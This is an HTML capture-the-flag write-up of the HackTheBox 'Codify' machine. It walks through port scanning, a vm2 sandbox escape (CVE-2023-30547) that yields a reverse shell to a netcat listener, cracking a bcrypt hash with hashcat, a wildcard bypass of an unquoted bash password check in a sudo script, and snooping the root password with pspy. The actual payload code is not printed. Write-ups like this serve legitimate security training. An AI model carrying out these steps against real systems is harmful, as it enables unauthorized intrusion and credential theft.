@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Codify - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Codify</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Codify</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>OS:</strong> Linux</p>
+        <p><strong>Date Completed:</strong> 25-06-2026</p>
+        <p><strong>IP Address:</strong> 10.129.21.70</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Enumeration showed 3 ports were open, SSH, HTTP and NodeJS on 22, 80 and 3000 respectively. When enumerating the website I found a NodeJS editor and a security package being used. When researching this package it turned out to be vulnerable for NodeJS payload in the editor. By using the CVE-2023-30547 PoC, I could get a reverse shell as the user svc. When further enumerating the box I found another NodeJS service that had a database file with a hash. When cracking this hash I could login as the user. From user enumeration I found a bash script that I could run as sudo. When examining the script, I could see two flaws. With these flaws I could bypass the password restriction and snoop the root password in processes with the pspy tool. When the pspy tool showed the password in plaintext, I could login as root and fully compromise the box.</p>
+    <h2>Enumeration</h2>
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sCV -T4 10.129.21.70</code></pre>
+    <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://codify.htb/
+3000/tcp open  http    Node.js Express framework
+|_http-title: Codify</code></pre>
+    <p><strong>Results:</strong></p>
+    <ul>
+        <li>Port 22: SSH</li>
+        <li>Port 80: HTTP</li>
+        <li>Port 3000: NodeJS</li>
+    </ul>
+    <h3>Web Enumeration</h3>
+    <p>Visiting the website showed a welcome/explanation page that explained it could test and run your NodeJS code in browser.</p>
+    <div class="shot">
+        <img src="codify_01.png" alt="Codify welcome page"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_01.png</code><br>Codify welcome page</div>
+    </div>
+    <p>Visiting the other pages I found an editor box and some useful information about the limitations and which security package they used.</p>
+    <div class="shot">
+        <img src="codify_02.png" alt="Codify editor page"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_02.png</code><br>Codify editor page</div>
+    </div>
+    <div class="shot">
+        <img src="codify_03.png" alt="About Us page referencing the vm2 package"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_03.png</code><br>About Us page referencing the vm2 package</div>
+    </div>
+    <p>In the screenshot 'About Us' shows a hyperlink to the vm2 package they use. They use version 3.9.16.</p>
+    <h2>Initial Foothold</h2>
+    <h3>Vulnerability Discovery</h3>
+    <p>As I noted in the previous screenshot there was a visible security package called vm2. The box runs version 3.9.16. Searching this version shows a PoC CVE which explains a sandbox escape exploit.</p>
+    <div class="highlight">
+    <p><strong>CVE:</strong> CVE-2023-30547</p>
+    </div>
+    <h3>Exploitation</h3>
+    <p>The CVE PoC that I found executed a reverse shell by uploading the payload to the editor page. By running the PoC you can enter your listener details and receive a reverse shell. Or you can manually enter the NodeJS payload in the editor and receive a reverse shell that way.</p>
+    <h4>NetCat listener</h4>
+    <pre><code>└──╼ [★]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444</code></pre>
+    <h4>Exploit command</h4>
+    <pre><code>└──╼ [★]$ python3 Codify_exploit.py
+Listening IP address:&gt; 10.10.14.53
+Listening Port:&gt;       4444
+Host Alive ? .. Verifying..</code></pre>
+    <p>After running this payload, my listener received a connection. I also tried the manual method by pasting the NodeJS payload directly into the editor.</p>
+    <div class="shot">
+        <img src="codify_04.png" alt="Editor with vm2 sandbox-escape payload and received reverse shell as svc"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_04.png</code><br>Editor with vm2 sandbox-escape payload and received reverse shell as svc</div>
+    </div>
+    <p>With both methods I receive a connection as svc. This is not the user and further enumeration is needed.</p>
+    <h3>Enumeration as 'svc'</h3>
+    <p>After manually searching through the files I found another NodeJS app running in the webroot <code>/var/www</code>. In this directory there was another NodeJS app which had a database file called <code>tickets.db</code>. After downloading this database file to my attacker host I could dump the file and find the hash for the user Joshua.</p>
+    <div class="shot">
+        <img src="codify_05.png" alt="tickets.db opened in DB Browser showing joshua bcrypt hash"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_05.png</code><br>tickets.db opened in DB Browser showing joshua bcrypt hash</div>
+    </div>
+    <h3>Pivoting to user</h3>
+    <p>With the hash and username found, I can run a hashcat together with rockyou.txt and crack the hash.</p>
+    <pre><code>└──╼ [★]$ hashcat -a 0 -m 3200 hash.txt rockyou.txt
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))</code></pre>
+    <p>Hashcat has successfully cracked the password.</p>
+    <h3>SSH as user and get user flag</h3>
+    <p>After I cracked the password, I attempted to login with the credentials in SSH.</p>
+    <pre><code>└──╼ [★]$ ssh joshua@10.129.21.70
+joshua@10.129.21.70's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+joshua@codify:~$ cat user.txt</code></pre>
+    <p>I am successfully logged in as Joshua and can grab the user flag.</p>
+    <h2>Privilege Escalation</h2>
+    <h3>Enumeration</h3>
+    <p>When I got access to the user, I immediately ran <code>sudo -l</code>. This showed that the user could run a SQL backup bash script. I tried to run the script and see what the script was built like.</p>
+    <pre><code>joshua@codify:~$ sudo -l
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+if [[ $DB_PASS == $USER_PASS ]]; then
+    /usr/bin/echo "Password confirmed!"
+else
+    /usr/bin/echo "Password confirmation failed!"
+    exit 1
+fi
+...</code></pre>
+    <p>When I run the script with sudo it still asked for my password. The password of joshua is not the correct one. I went to dig deeper into the backup script.</p>
+    <h3>Exploitation</h3>
+    <p>When checking the script and doing some research on bash scripting, I noticed two flaws. One flaw was in the password validation, where the right side of the comparison is not double quoted — a classic bash pitfall. Another flaw is that the password gets referenced from <code>/root/.creds</code>, which means I can snoop the processes to catch it. I found the pspy tool for this.</p>
+    <p>First I checked if the bypass works for the first bash pitfall. Because <code>[[ $DB_PASS == $USER_PASS ]]</code> is unquoted on the right side, supplying a wildcard <code>*</code> matches any value.</p>
+    <pre><code>joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root: *
+Password confirmed!
+Backing up database: mysql
+All databases backed up successfully!</code></pre>
+    <p>This worked. Next step is to run two SSH sessions as Joshua to run the script and the pspy tool to snoop.</p>
+    <pre><code># attacker host
+python3 -m http.server 8080
+# target, session 1
+~/pspy32
+# target, session 2
+sudo /opt/scripts/mysql-backup.sh</code></pre>
+    <div class="shot">
+        <img src="codify_06.png" alt="pspy output revealing the root MySQL password in a process command line"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>codify_06.png</code><br>pspy output revealing the root MySQL password in a process command line</div>
+    </div>
+    <p>After a short while I found the password passed in plaintext on the <code>mysql</code> command line that the root-run script spawns. Now I can run <code>su root</code> in my session as Joshua and enter the found password.</p>
+    <pre><code>joshua@codify:~$ su root
+Password:
+root@codify:/home/joshua# cat /root/root.txt</code></pre>
+    <p>I can read the root flag and the box is now pwned!</p>
+    <h2>Key Takeaways</h2>
+    <ul>
+        <li>Enumerating the website thoroughly and gathering all information can lead to a more clear and direct attack vector.</li>
+        <li>Researching the version numbers of software for CVE's can yield great results for exploitation.</li>
+        <li>A reverse shell from a website is not always www-data but can be any user that the admin has configured to run the webservice with.</li>
+        <li>Structural and methodical enumeration of the Linux filesystem is a must to effectively search for sensitive info.</li>
+        <li>Knowledge and good research about bash scripting was a valuable addition to find weaknesses in the script.</li>
+    </ul>
+    <h2>Tools Used</h2>
+    <ul>
+        <li>Nmap</li>
+        <li>PoC of CVE-2023-30547</li>
+        <li>NetCat</li>
+        <li>Pspy</li>
+        <li>Bash</li>
+        <li>Sqlite3</li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
